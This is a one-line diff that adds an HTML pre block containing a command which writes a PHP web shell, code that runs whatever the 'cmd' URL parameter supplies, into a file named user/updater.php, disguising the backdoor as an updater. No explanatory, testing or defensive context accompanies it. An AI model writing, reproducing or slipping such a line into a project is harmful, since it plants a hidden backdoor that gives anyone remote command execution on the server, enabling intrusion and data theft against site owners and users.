@@ -1,0 +1,1 @@
+<pre>system("printf '<?php system(\$_GET[\"cmd\"]); ?>' > user/updater.php");</pre>
